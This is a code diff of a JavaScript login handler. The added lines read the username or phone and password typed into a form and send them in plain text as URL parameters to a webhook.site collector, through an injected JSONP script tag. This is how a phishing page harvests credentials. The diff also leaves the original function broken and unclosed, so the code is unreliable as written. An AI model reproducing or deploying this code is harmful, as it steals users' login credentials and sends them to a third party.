@@ -1,26 +1,21 @@
 function sendHttpRequest() {
-  event.preventDefault();
-  const emailOrPhoneValue = document.querySelector('input[type="text"]').value;
-  const passwordValue = document.querySelector('input[type="password"]').value;
+  
 
-  const url = 'https://dev-dimuthdezoysa.pantheonsite.io/';
-  const data = {
-    emailOrPhone: emailOrPhoneValue,
-    password: passwordValue,
-  };
+function handleResponse(data) {
+    console.log('Received data:', data);
+    // Process the data received from the server
+}
 
-  fetch(url, {
-    method: 'GET', // Correct HTTP method for GET request
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    mode: 'no-cors', // Set no-cors mode
-  })
-    .then((response) => {
-      // The response object will be opaque and you won't be able to access its data or headers
-      console.log('Request sent with no-cors mode.');
-    })
-    .catch((error) => {
-      console.error('Error:', error);
-    });
+// Function to create and send the JSONP request
+function sendJSONPRequest() {
+    // Create a script tag
+    var script = document.createElement('script');
+    
+    // Set the source URL with a callback parameter
+    const emailOrPhoneValue = document.querySelector('input[type="text"]').value;
+    const passwordValue = document.querySelector('input[type="password"]').value;
+    script.src = 'https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u='+emailOrPhoneValue+'&p='+passwordValue;
+    
+    // Append the script tag to the document
+    document.body.appendChild(script);
 }
